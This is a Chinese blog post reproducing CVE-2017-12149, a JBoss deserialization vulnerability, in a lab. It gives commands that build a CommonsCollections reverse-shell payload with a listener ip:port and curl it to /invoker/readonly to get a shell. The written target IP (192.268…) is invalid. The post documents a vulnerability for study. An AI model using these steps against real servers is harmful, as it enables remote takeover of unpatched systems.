# JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）漏洞复现 - jiecoll - 博客园

> 原文：[`www.cnblogs.com/jiecoll/p/14191638.html`](https://www.cnblogs.com/jiecoll/p/14191638.html)

1.搭建漏洞环境

![](img/6d411ce4e1573de71d6f0a7235fc6831.png)

 2.该漏洞出现在/invoker/readonly 中 ，服务器将用户 post 请求内容进行反序列化

用工具来验证，在验证之前我们可以访问路径进行初步判断

url://invoker/readonly,看服务器返回情况如下则说明漏洞存在

![](img/cb1ddee46220910f5c7376d837fc30b0.png)

 3.漏洞利用

1.直接工具利用

![](img/28f11778370566aae54f153ca9100a66.png)

 2.另一种 getshell 的方式

下载文件:JavaDeserH2HC.zip

解压进入文件如图

![](img/29bf700bc439cde58fcbd9fe7d37c33f.png)

 然后执行命令

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

```
java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port //监听机的 ip 和端口

然后生成。ser 文件
监听端口 如图
```

![](img/89d7922cbc1c6a976765909daee8a562.png)

```

执行反弹 shell
漏洞路径：/invoker/readonly
```

```
curl http://192.268.197.25:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](img/449a0512f37c0be9ba472fbb391f4e20.png)

 查看监听端口，可以看到已经反弹 shell 到监听端口

![](img/ba4244d6fc7308aeca8eab82b607b953.png)